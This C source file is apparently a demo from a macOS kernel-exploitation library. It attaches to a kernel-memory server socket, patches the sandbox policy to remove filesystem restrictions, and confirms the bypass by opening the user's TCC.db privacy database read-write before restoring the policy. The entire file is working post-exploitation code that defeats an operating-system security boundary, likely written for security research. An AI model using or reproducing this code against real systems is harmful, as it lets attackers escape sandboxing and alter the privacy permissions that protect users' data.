//
//  main.c
//  demo_sb
//
//  Created by user on 1/7/22.
//

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <limits.h>

#include <sys/fcntl.h>
#include <sys/errno.h>

#include <xpl/xpl.h>
#include <xpl/memory/kmem.h>
#include <xpl/memory/kmem_remote.h>
#include <xpl/slider/kernel.h>
#include <xpl/util/log.h>
#include <xpl/util/sandbox.h>
#include <xpl/util/assert.h>


int main(int argc, const char * argv[]) {
    const char* kmem_socket = XPL_DEFAULT_KMEM_SOCKET;
    
    int ch;
    while ((ch = getopt(argc, (char**)argv, "k:")) != -1) {
        switch (ch) {
            case 'k': {
                kmem_socket = optarg;
                break;
            }
            case '?':
            default: {
                xpl_log_info("usage: demo_sb [-k kmem_uds]");
                exit(1);
            }
        }
    }
    
    xpl_init();
    xpl_kmem_backend_t backend;
    int error = xpl_kmem_remote_client_create(kmem_socket, &backend);
    if (error) {
        xpl_log_error("failed to connect to kmem server unix domain socket %s, err: %s", kmem_socket, strerror(error));
        exit(1);
    }
    
    xpl_kmem_use_backend(backend);
    xpl_slider_kernel_init(xpl_kmem_remote_client_get_mh_execute_header(backend));
    
    xpl_sandbox_t sandbox = xpl_sandbox_create();
    xpl_log_info("patching sandbox policy to get unrestricted filesystem access");
    xpl_sandbox_disable_fs_restrictions(sandbox);
    
    xpl_log_info("verifying unrestricted filesystem access");
    char* home = getenv("HOME");
    char tcc_db[PATH_MAX];
    snprintf(tcc_db, sizeof(tcc_db), "%s/Library/Application Support/com.apple.TCC/TCC.db", home);
    int fd = open(tcc_db, O_RDWR);
    if (fd < 0) {
        xpl_log_error("verfication failed, failed to open TCC.db at %s, err: %s", tcc_db, strerror(errno));
        xpl_sandbox_destroy(&sandbox);
        exit(1);
    } else {
        xpl_log_info("tcc.db open ok, verification success");
    }
    
    getpass("\npress enter to restore sandbox policy\n");
    
    xpl_log_info("restoring sandbox policy");
    xpl_sandbox_destroy(&sandbox);
    return 0;
}
